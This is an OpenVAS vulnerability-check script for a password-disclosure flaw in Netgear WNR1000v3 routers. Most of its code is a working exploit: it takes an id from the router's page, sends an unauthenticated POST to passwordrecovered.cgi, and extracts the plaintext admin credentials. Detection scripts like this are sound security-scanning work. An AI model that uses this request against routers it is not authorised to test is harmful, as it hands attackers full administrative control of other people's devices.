###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netgear_wnr1000v3_information_disclosure.nasl 6699 2017-07-12 12:07:37Z cfischer $
#
# NETGEAR WNR1000v3 Password Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_insight = "Netgear WNR1000v3 routers suffer from a flaw in the
password recovery flow that allows for disclosure of the plaintext
router credentials.";
 
tag_impact = "An attacker can exploit this issue to bypass certain security
restrictions and gain unauthorized administrative access to the
affected application.";

tag_affected = "Tested Device Firmware Versions: V1.0.2.60_60.0.86
and V1.0.2.54_60.0.82NA";

tag_summary = "Newer firmware versions of the Netgear N150 WNR1000v3
wireless router are affected by a password recovery vulnerability.
Exploiting this vulnerability allows an attacker to recover the
router's (plaintext) Administrator credentials and subsequently gain
full access to the device. This vulnerabilty can be exploited remotely
if the remote administration access feature is enabled (as well as
locally via wired or wireless access).";

tag_solution = "Ask the Vendor for an update.";

tag_vuldetect = "Send some special crafted request to determine if it
is possible to read username and password.";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103880");
 script_version ("$Revision: 6699 $");
 script_tag(name:"cvss_base", value:"9.4");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:C");

 script_name("NETGEAR WNR1000v3 Password Disclosure Vulnerability");

 script_xref(name:"URL", value:"http://packetstormsecurity.com/files/124759/NETGEAR-WNR1000v3-Password-Disclosure.html");
 
 script_tag(name:"last_modification", value:"$Date: 2017-07-12 14:07:37 +0200 (Wed, 12 Jul 2017) $");
 script_tag(name:"creation_date", value:"2014-01-14 10:28:55 +0100 (Tue, 14 Jan 2014)");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
 script_dependencies("gb_get_http_banner.nasl");
 script_require_ports("Services/www", 80, 8080);
 script_mandatory_keys("WNR1000v3/banner");

 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "vuldetect" , value : tag_vuldetect);
 script_tag(name : "insight" , value : tag_insight);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "affected" , value : tag_affected);

 script_tag(name:"qod_type", value:"remote_app");

 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port( default:8080 );

banner = get_http_banner(port:port);
if ( "NETGEAR WNR1000v3" >!< banner ) exit (0 );

req = http_get( item:'/', port:port );
buf = http_send_recv( port:port, data:req, bodyonly:FALSE );

id = eregmatch( pattern:"unauth.cgi\?id=([0-9]+)", string: buf);
if ( isnull ( id[1] ) ) exit ( 0 );

id = id[1];

host = get_host_name();
if( port != 80 && port != 443 )
  host += ':' + port;

req = 'POST /passwordrecovered.cgi?id=' + id + ' HTTP/1.1\r\n' +
      'Accept-Encoding: identity\r\n' + 
      'Content-Length: 0\r\n' + 
      'Host: ' + host + '\r\n' +
      'Connection: close\r\n' + 
      'User-Agent: ' + OPENVAS_HTTP_USER_AGENT  + '\r\n\r\n';

result = http_send_recv( port:port, data:req, bodyonly:FALSE );

if ( "Router Password Recovered" >!< result ) exit ( 99 );

lines = split ( result );

x = 0; 

foreach line ( lines ) 
{
  if ( "Router Admin Username" >< line )
  {
    username = eregmatch ( pattern:'<td class="MNUText" align="left">([^<]+)</td>', string: lines[ x+1 ] );
    if ( isnull ( username[1] ) ) exit(0); 
  }  

  if ( "Router Admin Password" >< line )
  {
    password = eregmatch ( pattern:'<td class="MNUText" align="left">([^<]+)</td>', string: lines[ x+1 ] );
    if ( isnull ( password[1] ) ) password[1] = 'empty password';
  }  

  x++;
}  

if ( username[1] ) 
{
  report = 'It was possible to extract the username and the password of the remote WNR1000v3.\n\nUsername: ' + username[1] + '\nPassword: ' + password[1] + '\n';
  security_message( port:port, data:report );
  exit ( 0 );
}  

exit ( 99 );
